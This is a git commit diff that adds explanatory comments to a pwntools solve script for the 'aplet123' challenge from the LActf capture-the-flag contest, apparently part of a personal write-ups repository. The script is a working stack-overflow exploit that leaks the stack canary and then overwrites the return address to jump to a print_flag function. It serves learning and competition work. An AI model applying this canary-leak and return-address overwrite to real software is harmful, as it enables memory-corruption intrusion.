50840c95fb5d87cd71e94090743f6f10eb1a96ad
citadelhack <147342219+citadelhack@users.noreply.github.com>
2024-02-21 19:53:44 -0500

    Update apletsolve.py

--- LocalWriteups/LActf/aplet123/apletsolve.py
+++ LocalWriteups/LActf/aplet123/apletsolve.py
@@ -2,25 +2,36 @@ from pwn import *
 import re
 import struct
 
+#use p = remote('ip', port) for remote process
 p = process('./aplet123')
-#gdb.attach(p)
+#receive the starter text before it asks for input (not useful for us)
 p.recv(1024)
+
+#Compile the regex pattern to grab the leak from the output string
 pattern = re.compile(rb"hi (.*?),")
 
-leak_payload = b"A"*69 + b"i'm"
+#payload to cause the leak
+leak_payload = b"A"*69 + b"I'm"
 
+#send the leak payload
 p.sendline(leak_payload)
+
+#string containing canary leak
 canary_leak = p.recv(1024)
 
-print(canary_leak)
-
+#grab the actual leak from the string using the compiled regex
 match = pattern.search(canary_leak)
 
-print(match.group(1))
+#use the canary leak to overwrite the canary to bypass the stack check and overwrite the return address to print_flag function
+#could be optimized a bit better but this works as long as one of the characters of the leak isn't a comma
+payload = b"A"*72 + b"\x00" + match.group(1) + b"B"*7 + p64(0x4011e6) #B*7 instead of 8 since an extra byte is read from the saved rbp space
 
-payload = b"A"*72 + b"\x00" + match.group(1) + b"B"*7 + p64(0x4011e6) #B*7 instead of 8 since an extra byte is read from the rbp space
-
+#send the payload
 p.sendline(payload)
+
+#send the command to cause main to try and exit via its return address
 p.sendline(b"bye")
+
+#print all output (should include the flag)
 print(p.clean(2))
 
